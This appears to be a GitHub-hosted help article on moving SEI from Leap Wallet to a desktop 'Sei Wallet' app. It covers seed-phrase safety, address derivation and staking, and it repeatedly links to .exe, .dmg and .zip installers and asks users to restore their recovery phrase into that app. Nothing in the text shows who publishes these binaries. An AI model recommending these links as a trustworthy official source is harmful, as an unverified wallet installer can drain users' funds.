![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Migrating SEI from Leap Wallet to Sei Wallet</h1>

<p align="center">Recreate the account in the desktop app, or send the balance across instead.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Moving SEI out of Leap Wallet is a small operation wrapped in a lot of bad advice. Search for how to recover a Leap account and most of what ranks is written by parties who would like your seed phrase.

The task itself is small: the key that Leap held still controls an account on the Sei chain, so migration means putting that key into a wallet that is still maintained, then confirming you are looking at the right account before you move anything.

## What a wallet change does, and what it leaves alone

Leap Wallet is a Cosmos-focused wallet with a browser extension and mobile apps, and it also shipped Compass for Sei. Whatever the reason you are moving, the account itself does not change: the application is a window onto it, and windows are replaceable.

Swapping one window for another does not touch the account. Your delegation, balance and history are chain state. What you lose is the interface you were used to, its update stream, and any support channel you used to ask questions through — reasons to move deliberately, none of them a reason to panic.

## The order of operations that avoids loss

1. **Do not enter your seed phrase anywhere that is not a wallet you installed.** Recovery pages, "migration assistants", Discord helpers and support DMs are the entire risk of this moment: every one of those patterns needs your phrase to work.
2. **Establish whether Leap held a key at all.** If you used Leap with a Ledger, the key never left the device: reconnect the Ledger to a supported wallet and the account reappears. That path is [the Ledger connection guide](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md).
3. **Install a maintained wallet** from its operator's own domain, and satisfy yourself about the publisher your machine names before you launch it.
4. **Restore from the seed phrase**, then verify the address before doing anything else.
5. **Only then** decide what to do with staked positions.

## The restore step, and why the address may look wrong

Restoring recreates the account; it does not import the old app's settings. Two mismatches are common and neither means the funds are gone:

**A different `0x` address.** Wallets pick a derivation by default, and the account Leap used may sit on a different one. Most wallets let you add accounts or step through derivations until the familiar address appears. Keep stepping; do not "test" by sending funds to an address you have not confirmed.

**An unfamiliar `sei1` address.** Leap was Cosmos-first, so the address you remember may be the bech32 `sei1` form, while a new EVM-first wallet opens on the `0x` form. They are two views of one account, linked by on-chain association rather than by a setting you can toggle.

Write down the address you expect before you start, and compare it character by character after import. That single habit catches nearly every "my funds are missing" case.

## Moving a delegation

A staked position belongs to the account, not the wallet, so it will appear in any wallet reading that account. You have three options and no obligation:

- keep it delegated where it is;
- redelegate to another validator, which takes effect immediately;
- unstake, which starts the unbonding period and stops rewards on that amount.

Keep a liquid reserve either way. An account with everything bonded cannot pay the fee to unbond, which turns a routine exit into a wait for someone to send you a small amount, and a wait is not a fix.

## Do not trust the recovery content that ranks

Search results for Leap recovery are dominated by pages whose title promises to explain how to recover a wallet with a seed phrase. Some are legitimate explainers; some are harvesting tools. The distinction is not the design quality — it is whether the page asks you to type the phrase into the page. A wallet application asks for it during restore, on your own machine. A web page that asks for it is stealing the account, whatever it claims to be.

The same applies to anyone who contacts you first. Support does not open conversations, validators do not need your phrase, and no legitimate process requires you to send SEI to an address to "activate" a recovery.

## Cleaning up afterwards

Uninstall the Leap extension and the mobile app once the new wallet shows the right account. An app you have moved away from adds attack surface without adding a backup.

## If you came from Compass instead

Compass is Leap's Sei-specific sibling, and the equivalent route is in [the Compass migration route](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md). If your history is with Keplr rather than Leap, the mechanics are similar: [the Keplr route](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-out-of-keplr.md).

## Where the rest of your SEI might be

Migration is often the moment people discover a second balance somewhere else. Balances in Trust Wallet and on exchanges have their own routes: [the Trust Wallet exit](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md) and [the exchange withdrawal route](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md). The overview of what the destination wallet actually does is in [an overview of the app](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## Frequently asked questions

**What is Leap Wallet?** A Cosmos-focused wallet that supported Sei and shipped Compass as its Sei client.

**Is Leap Wallet still safe?** This article does not track its publisher's support status; what it can tell you is that moving the account does not depend on that status.

**Can I keep using Leap if I want to?** Yes. Nothing here requires you to move; these are the steps for when you decide to.

**Is the Leap app safe to keep on my phone?** Keeping it installed adds exposure without adding recovery. The seed phrase is the backup; the app is not.

**Can I migrate without the seed phrase?** Only if a hardware wallet holds the key, or another device still has the wallet installed and unlocked. There is no reset through the company.

**What if my balance is zero after restoring?** Check the derivation and the address form first. A zero balance on the wrong account looks identical to a lost account, and only one of those is real.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Using a Ledger hardware wallet with Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md)
- [Moving SEI off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md)
- [Moving SEI from Keplr to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-out-of-keplr.md)
- [Moving SEI out of Trust Wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md)
